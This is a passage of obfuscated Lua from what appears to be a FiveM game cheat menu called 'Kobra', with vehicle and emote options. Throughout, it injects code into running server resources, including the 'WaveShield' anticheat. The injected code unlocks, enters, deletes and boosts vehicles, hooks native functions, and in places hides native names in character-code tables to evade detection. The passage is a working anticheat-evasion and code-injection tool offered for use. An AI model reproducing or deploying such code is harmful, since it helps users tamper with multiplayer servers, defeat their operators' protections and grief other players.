                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end if (v438==(0 -0)) then v12:Notify("success","Kobra","Vehicle Max Upgraded",4259 -(1147 + 112) );v439=GetResourceState("WaveShield")=="started" ;v438=1 + 0 ;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v441=0 -0 ;while true do if (v441==0) then v12:Notify("success","Kobra","Deleted Vehicle",779 + 2221 );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v442=0;while true do if ((697 -(335 + 362))==v442) then v12:Notify("success","Kobra","Deleted Vehicle",2812 + 188 );MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() v12:Notify("success","Kobra","Teleported into Vehicle",4516 -1516 );MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v443) if v443 then local v614=0 -0 ;while true do if (v614==(0 -0)) then v12:Notify("success","Kobra","Boost Vehicle On",8514 -5514 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end break;end end else local v615=566 -(237 + 329) ;while true do if (v615==0) then v12:Notify("error","Kobra","Boost Vehicle Off",10743 -7743 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v444) local v445=GetResourceState("WaveShield")=="started" ;local v446=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v444 then if v445 then v12:Notify("success","Kobra","Instant Brakes On",1978 + 1022 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);else v48(v446,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",1642 + 1358 );end elseif v445 then local v792=0;while true do if (v792==0) then v12:Notify("success","Kobra","Instant Brakes Off",4124 -(408 + 716) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v793=0 -0 ;while true do if (v793==(821 -(344 + 477))) then v48(v446,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",511 + 2489 );break;end end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v447) local v448=GetResourceState("WaveShield")=="started" ;local v449=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v447 then if v448 then local v794=0;while true do if (v794==0) then v12:Notify("success","Kobra","Easy Handling On",3000);MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v795=0;while true do if (v795==(1761 -(1188 + 573))) then v48(v449,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",7861 -4861 );break;end end end elseif v448 then v12:Notify("success","Kobra","Easy Handling Off",2923 + 77 );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else v48(v449,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",9732 -6732 );end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v450) local v451=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v450 then local v616=0 -0 ;while true do if (v616==(1529 -(508 + 1021))) then v12:Notify("success","Kobra","Rainbow Vehicle On",2820 + 180 );if (GetResourceState("WaveShield")=="started") then local v933=0;while true do if (v933==(1166 -(228 + 938))) then print("souygdfg");v48(v451,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v48(v451,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else v12:Notify("error","Kobra","Rainbow Vehicle Off",3685 -(332 + 353) );if (GetResourceState("WaveShield")=="started") then local v796=0;while true do if (v796==(0 -0)) then print("swave");v48(v451,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v48(v451,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v452) if v452 then local v617=0 -0 ;while true do if (v617==0) then v12:Notify("success","Kobra","Unlimited Fuel On",2843 + 157 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);break;end end else local v618=0;while true do if (v618==(0 + 0)) then v12:Notify("error","Kobra","Unlimited Fuel Off",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
